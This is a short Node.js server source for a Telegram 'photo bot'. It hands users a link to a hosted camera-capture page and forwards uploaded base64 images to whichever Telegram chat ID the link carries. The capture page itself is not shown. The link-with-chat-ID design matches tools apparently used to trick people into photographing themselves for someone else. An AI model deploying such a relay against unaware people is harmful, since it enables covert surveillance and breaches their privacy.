import express from "express";
import path from "path";
import { fileURLToPath } from "url";
import TelegramBot from "node-telegram-bot-api";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
app.use(express.static("public"));
app.use(express.json());

const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: true });

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const link = `https://probable-fishstick-gu43.onrender.com/capture?chat_id=${chatId}`;
  bot.sendMessage(chatId, `📸 Click here to open the camera:\n${link}`);
});

app.get("/capture", (req, res) => {
  res.sendFile(path.join(__dirname, "../public/capture.html"));
});

app.get("/", (req, res) => {
  res.send(`
    <h2>Telegram Photo Bot is Running ✅</h2>
    <p>Use <a href="/capture?chat_id=123456">/capture</a> route to test camera access.</p>
  `);
});

app.post("/upload", async (req, res) => {
  const { chatId, photoData } = req.body;
  const buffer = Buffer.from(photoData, "base64");
  try {
    await bot.sendPhoto(chatId, buffer);
    res.status(200).send("✅ Sent to Telegram!");
  } catch (err) {
    console.error(err);
    res.status(500).send("❌ Error sending photo.");
  }
});

app.listen(3000, () => console.log('Server running on port 3000'));
